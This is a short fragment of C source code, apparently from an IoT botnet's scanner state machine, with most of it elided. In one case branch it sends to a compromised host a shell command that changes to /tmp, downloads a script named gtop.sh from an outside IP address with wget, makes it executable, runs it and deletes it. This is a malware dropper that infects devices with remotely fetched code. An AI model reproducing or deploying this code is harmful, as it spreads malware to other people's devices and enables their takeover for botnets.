			...
			case 8:
				{
					...
					if(send(fds[i].fd, "cd /tmp ; wget http://104.131.117.130/gtop.sh ; chmod +x gtop.sh ; sh gtop.sh ; rm gtop.sh", 59, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
